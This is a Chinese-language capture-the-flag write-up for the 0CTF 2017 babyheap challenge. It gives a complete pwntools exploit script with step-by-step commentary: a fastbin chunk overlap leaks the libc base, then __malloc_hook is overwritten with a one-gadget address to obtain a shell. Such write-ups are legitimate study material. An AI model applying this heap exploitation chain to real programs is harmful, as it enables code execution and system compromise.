# 解析 Baby-Heap-2017-255 问题

> 主要参考了 [http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html](http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html)

## 起源
> 这里调用了一个在libc中的重要BUG 就是利用在进行fastbin中不进行检查，而产生的。
> 要了解fastbin请参看[浅析Linux堆溢出之fastbin](http://www.freebuf.com/news/88660.html) 
> 在这里，其实它就是要用函数对malloc本身的不检查被使用的内容，而进行的操作

```python
def exploit(r):
    r.recvuntil(': ')

    alloc(0x20)             
    alloc(0x20)
    alloc(0x20)
    alloc(0x20)
    alloc(0x80)                 #  <1>

    free(1)
    free(2)                     #  <2>

    payload  = p64(0)*5
    payload += p64(0x31)
    payload += p64(0)*5
    payload += p64(0x31)
    payload += p8(0xc0)
    fill(0, payload)            #  <3>

    payload  = p64(0)*5
    payload += p64(0x31)
    fill(3, payload)            #  <4>

    alloc(0x20)
    alloc(0x20)                 #  <5>


    payload  = p64(0)*5
    payload += p64(0x91)
    fill(3, payload)            #  <6>
    alloc(0x80)                 #  <7>
    free(4)                     #  <8>

    libc_base = u64(dump(2)[:8]) - 0x3a5678
    log.info("libc_base: " + hex(libc_base))

    alloc(0x68)                 #  <9>
    free(4)                     #  <10>

    fill(2, p64(libc_base + 0x3a55ed))
    alloc(0x60)
    alloc(0x60)                 #  <11>

    payload  = '\x00'*3
    payload += p64(0)*2
    payload += p64(libc_base + 0x41374)
    fill(6, payload)            #  <12>
    log.info('wait for pause')
    pause()
    alloc(255)                  #  <13>

    r.interactive()

```

> 下面对于上面的代码进行解释，（对于pwn或者python不懂的人，请参考[pwn tutorial](https://docs.pwntools.com/en/stable/)）
> <1> 的位置，其实，就是分配了5个内存。这里分配前4个是在fastbin上进行分配的，而4号是在smallbin上进行分配的。这些都是有用的。
> <2> 这里释放了 1号与2号内存，记住0号内存没有释放。
> <3> 这里其实写了原来的1号与2号内存进行管理的header，这个时候就是设置为0x31，这个值是表示在fastbin中进行分配的。这里最后修改为0xc0的目的是把这个进行伪造成smallbin分配的内存。这个在2号就是在smallbin上分配了。
> <4> 这里是3号内存进行覆写。这里是把4号内存的header flag写了。
> <5> 又申请了1号与2号内存。这个时候，2号内存是与4号内存同一个地址，这个是进行处理的。
> <6> 把4号内存修改为0x91的flag，这个已经是可以在smallbin中实现的。
> <7> 这里分配了5号内存，这个是从smallbin 分配，这个是可以覆盖了bin地址
> <8> 释放4号内存，这时这个值是得到4号的main_arena的内容，2号内存是指向同一个地址，所以相同可以得到
> <9> 得到2号内存的main_arena地址，这个地址与libc的加载头地址的差值是0x3a5678,至于如何得到，这里请用gdb 与readelf进行读取。
> <10> 这里释放了4号内存，前面在<8>中得到的0x91使得它是用smallbin地址，这样可以设置进行设置0x31
> <11> 分配4号与6号内存，这些地址是可以进行处理的smallbin，
> <12> 设置地址是一段可执行exec("/bin/sh",args,__environ) 的起始代码，这个找到是进行disassemble。
> <13> 当时行分配的时候，原来的__malloc_hook已经进行了修改，就是我们修改的代码，这个时候，可以调用exec了。
> 
> 从全部的步骤看，这里的使用，真的进行攻击不是一个好方案，不但方法特别，而且不一定进攻确定。